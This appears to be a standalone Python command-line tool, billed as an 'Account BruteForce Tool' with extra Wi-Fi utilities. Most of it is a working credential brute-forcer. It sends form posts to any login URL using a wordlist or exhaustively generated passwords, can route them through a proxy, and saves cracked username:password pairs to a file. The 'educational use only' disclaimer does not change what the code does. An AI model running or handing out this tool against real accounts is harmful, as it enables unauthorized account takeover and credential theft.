import os
import time
import requests
import itertools
from colorama import init, Fore, Back, Style

init()

def print_header():
    os.system("clear" if os.name == "posix" else "cls")
    print("="*60)
    print(r"""    
███╗   ███╗    ███████╗    ██████╗      ██████╗ 
████╗ ████║    ██╔════╝    ██╔══██╗    ██╔═══██╗
██╔████╔██║    █████╗      ██║  ██║    ██║   ██║
██║╚██╔╝██║    ██╔══╝      ██║  ██║    ██║   ██║
██║ ╚═╝ ██║    ███████╗    ██████╔╝    ╚██████╔╝
╚═╝     ╚═╝    ╚══════╝    ╚═════╝      ╚═════╝     
       Account BruteForce Tool v2.0 + Wi-Fi Tools
""")
    print("="*60)
    print(Back.RED + Fore.WHITE + Style.BRIGHT + "[!] WARNING & DISCLAIMER:" + Style.RESET_ALL)
    print(Fore.RED + Style.BRIGHT + "This tool is for EDUCATIONAL and ETHICAL hacking purposes ONLY.")
    print("Unauthorized access to accounts or systems is ILLEGAL and PROHIBITED.")
    print("The developer " + Style.BRIGHT + "Mohammad Salem" + Style.NORMAL + " is NOT responsible for any misuse or damage.")
    print("Use this tool ONLY on systems you own or have explicit permission to test." + Style.RESET_ALL)
    print("="*60)
    input(Fore.YELLOW + "Press ENTER to agree and continue..." + Style.RESET_ALL)

def try_login(url, username_field, password_field, username, password, proxy):
    data = {username_field: username, password_field: password}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = requests.post(url, data=data, proxies=proxies, timeout=10)
        if response.status_code == 200 and "invalid" not in response.text.lower() and "error" not in response.text.lower():
            print(f"\n\033[92m[✓] FOUND! Password: {password}\033[0m")
            with open("found.txt", "a") as f:
                f.write(f"[FOUND] {username}:{password}\n")
            return True
        else:
            print(f"[!] Tried: {password}", end='\r')
            with open("log.txt", "a") as f:
                f.write(f"[FAIL] {username}:{password} @ {time.ctime()}\n")
            return False
    except Exception as e:
        print(f"\n[-] Request failed ({proxy if proxy else 'No Proxy'}): {e}")
        return False

def wifi_tools():
    while True:
        print("\n[ Wi-Fi Tools ]")
        print("1. Scan nearby networks (Linux/Termux only)")
        print("2. Show connected network")
        print("3. Internet speed test")
        print("0. Back to main menu")

        choice = input("[*] Choose option: ")

        if choice == "1":
            os.system("nmcli dev wifi" if os.name == "posix" else "echo Only available on Linux/Termux")
        elif choice == "2":
            os.system("iwgetid" if os.name == "posix" else "echo Only available on Linux/Termux")
        elif choice == "3":
            try:
                import speedtest
            except ImportError:
                print("[!] Installing speedtest-cli...")
                os.system("pip install speedtest-cli")
            try:
                s = speedtest.Speedtest()
                print("[*] Download:", round(s.download() / 1_000_000, 2), "Mbps")
                print("[*] Upload:", round(s.upload() / 1_000_000, 2), "Mbps")
                print("[*] Ping:", s.results.ping, "ms")
            except Exception as e:
                print("[-] Speed test failed:", e)
        elif choice == "0":
            break
        else:
            print("[-] Invalid option.")

def bruteforce_main():
    url = input("[?] Enter Login URL: ").strip()
    username_field = input("[?] Username field: ").strip()
    password_field = input("[?] Password field: ").strip()
    username = input("[?] Fixed Username/Email: ").strip()

    proxy = input("[?] Proxy (IP:PORT) [Enter to skip]: ").strip()
    if proxy:
        print(f"[✓] Proxy set: {proxy}")
    else:
        proxy = None
        print("[!] No proxy set, continuing without proxy.")

    print("\n[1] Use Wordlist")
    print("[2] Auto Generate Passwords")
    method = input("[*] Choose method: ")

    passwords = []

    if method == '1':
        wordlist_path = input("[?] Wordlist path: ").strip()
        if not os.path.isfile(wordlist_path):
            print("[-] Wordlist file not found.")
            return
        with open(wordlist_path, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    elif method == '2':
        while True:
            try:
                length = int(input("[?] Password Length (0 = unknown): "))
                break
            except ValueError:
                print("[-] Enter a valid number.")
        if length == 0:
            print("[!] Starting from length 1 and increasing until found.")
            easy_hard = input("[1] Easy (letters/numbers)\n[2] Hard (symbols included)\n[*] Choose: ")
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            if easy_hard == '2':
                charset += "!@#$%^&*()-_=+[]{};:'\"\\|,.<>?/"

            max_length = 6
            for l in range(1, max_length+1):
                print(f"\n[*] Trying length {l}")
                for guess in itertools.product(charset, repeat=l):
                    password = ''.join(guess)
                    if try_login(url, username_field, password_field, username, password, proxy):
                        input("\nPress Enter to exit...")
                        return
                print(f"[-] Length {l} done, increasing length...")
            print("[-] Finished up to max length. Password not found.")
            return
        else:
            easy_hard = input("[1] Easy (letters/numbers)\n[2] Hard (symbols included)\n[*] Choose: ")
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
            if easy_hard == '2':
                charset += "!@#$%^&*()-_=+[]{};:'\"\\|,.<>?/"
            passwords = (''.join(p) for p in itertools.product(charset, repeat=length))
    else:
        print("[-] Invalid choice.")
        return

    delay = float(input("[?] Delay between attempts (seconds): "))

    for password in passwords:
        if try_login(url, username_field, password_field, username, password, proxy):
            input("\nPress Enter to exit...")
            return
        time.sleep(delay)

    print("\n[-] Done. Password not found.")

def main():
    print_header()
    while True:
        print("\n[ Main Menu ]")
        print("1. Account BruteForce")
        print("2. Wi-Fi Tools")
        print("0. Exit")
        choice = input("[*] Choose option: ")

        if choice == "1":
            bruteforce_main()
        elif choice == "2":
            wifi_tools()
        elif choice == "0":
            print("Exiting... Goodbye.")
            break
        else:
            print("[-] Invalid option.")
            time.sleep(1)

if __name__ == "__main__":
    main()
